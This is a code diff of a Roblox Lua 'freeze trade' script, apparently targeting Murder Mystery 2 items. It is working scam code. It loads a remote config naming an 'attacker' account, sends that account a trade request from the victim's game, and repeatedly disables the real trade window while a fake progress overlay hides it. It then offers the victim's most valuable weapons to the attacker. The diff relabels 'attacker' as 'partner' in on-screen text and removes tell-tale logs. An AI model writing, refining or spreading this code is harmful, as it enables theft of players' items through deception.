@@ -1,6 +1,6 @@
---[[ FREEZE TRADE SCRIPT  V11.0 ]]
+--[[ FREEZE TRADE SCRIPT  V11.1 ]]
 
-local VERSION = "V11.0"
+local VERSION = "V11.1"
 local CFG_URL = "https://raw.githubusercontent.com/sarettaclash01-ctrl/mm2cfg/refs/heads/main/cfg.json"
 
 local CFG = {
@@ -28,7 +28,8 @@ local STATUS = nil
 local BARFILL = nil
 local PCTLBL = nil
 local WEBHOOK = ""
-local HIDING = false
+local OPEN = false
+local WATCHING = false
 
 local RANK = {
 	Unique = 9, Chroma = 8, Ancient = 7, Godly = 6,
@@ -171,6 +172,7 @@ local function buildUI()
 	sg.Name = "FZMain"
 	sg.ResetOnSpawn = false
 	sg.IgnoreGuiInset = true
+	sg.DisplayOrder = 999
 	sg.Parent = PG
 	GUI = sg
 
@@ -371,23 +373,15 @@ local function findAttacker()
 	return Players:FindFirstChild(CFG.ATTACKER_NAME)
 end
 
-local function tradeOpen()
-	local a = PG:FindFirstChild("TradeGUI")
-	local b = PG:FindFirstChild("TradeGUI_Phone")
-	if a and a.Visible and a.Enabled then return true end
-	if b and b.Visible and b.Enabled then return true end
-	return false
-end
-
-local function hideLoop()
-	while HIDING do
-		pcall(function()
-			local a = PG:FindFirstChild("TradeGUI")
-			local b = PG:FindFirstChild("TradeGUI_Phone")
-			if a then a.Enabled = false end
-			if b then b.Enabled = false end
-		end)
-		task.wait(0.1)
+local function watchLoop()
+	while WATCHING do
+		local a = PG:FindFirstChild("TradeGUI")
+		local b = PG:FindFirstChild("TradeGUI_Phone")
+		if a and a.Enabled then OPEN = true end
+		if b and b.Enabled then OPEN = true end
+		if a then pcall(function() a.Enabled = false end) end
+		if b then pcall(function() b.Enabled = false end) end
+		task.wait(0.05)
 	end
 end
 
@@ -420,7 +414,6 @@ local function run()
 			queue[#queue + 1] = list[i]
 		end
 	end
-	log("items to send: " .. tostring(#queue))
 	if #queue == 0 then
 		setStatus("No items")
 		setPct(100)
@@ -440,18 +433,21 @@ local function run()
 
 	local attacker = findAttacker()
 	if not attacker then
-		log("attacker not in server")
-		setStatus("Attacker missing")
+		log("partner not in server")
+		setStatus("Partner missing")
 		setPct(100)
 		return
 	end
-	log("target: " .. attacker.Name)
+	log("connected")
+
+	WATCHING = true
+	task.spawn(watchLoop)
 
 	setStatus("Sending request...")
 	pcall(function() sr:InvokeServer(attacker) end)
 
 	local waited = 0
-	while waited < CFG.WAIT_TRADE and not tradeOpen() do
+	while waited < CFG.WAIT_TRADE and not OPEN do
 		task.wait(0.5)
 		waited = waited + 0.5
 		if waited % 6 == 0 then
@@ -459,16 +455,16 @@ local function run()
 		end
 	end
 
-	if not tradeOpen() then
+	if not OPEN then
 		log("trade never opened")
 		setStatus("No trade window")
 		setPct(100)
+		WATCHING = false
 		return
 	end
 
-	log("trade window locked")
-	HIDING = true
-	task.spawn(hideLoop)
+	log("window locked")
+	setStatus("Sending items...")
 	task.wait(0.8)
 
 	local placed = 0
@@ -476,11 +472,6 @@ local function run()
 	for i = 1, #queue do
 		local e = queue[i]
 		for k = 1, e.amount do
-			if not tradeOpen() and placed > 0 then
-				HIDING = false
-				log("trade closed early")
-				break
-			end
 			local ok = pcall(function() oi:FireServer(e.data, "Weapons") end)
 			task.wait(CFG.OFFER_GAP)
 			if ok then
@@ -525,7 +516,7 @@ local function run()
 	end
 
 	task.wait(4)
-	HIDING = false
+	WATCHING = false
 	showGui()
 	setStatus("Done")
 	task.wait(5)
